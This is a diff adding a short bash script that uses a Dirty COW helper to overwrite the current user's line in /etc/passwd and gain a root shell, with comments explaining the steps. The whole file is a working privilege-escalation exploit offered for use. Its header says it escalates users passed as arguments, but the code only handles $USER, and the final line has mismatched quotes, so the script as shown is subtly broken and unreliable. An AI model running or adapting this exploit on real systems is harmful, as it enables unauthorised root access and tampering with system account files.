@@ -1,0 +1,21 @@
+#!/bin/bash
+#
+# Edit /etc/passwd to give user(s) root privileges.
+#
+# If arguments are passed, they are taken as users to escalate. Otherwise, $USER
+# is assumed instead.
+#
+# This will likely make the X session unstable if used on the current user.
+# By editing the user's UID in /etc/passwd, many things that check the user's
+# UID (e.g., sudo) will fail. Because of this, the unmodified version of
+# /etc/passwd is backed up to $HOME before performing the exploit.
+#
+# After running this script, switch to a TTY and log in as the user(s)
+# to gain a root shell.
+
+. "$(dirname "$0")/common.sh"
+
+backup /etc/passwd "$HOME/passwd"
+offset="$(grep --byte-offset "^$USER" /etc/passwd | cut --delimiter=':' --fields=1)"
+dirtycow -s "$USER:*" -o "$offset" /etc/passwd
+sudo bash -c 'echo 0 >/proc/sys/vm/dirty_writeback_centisecs"
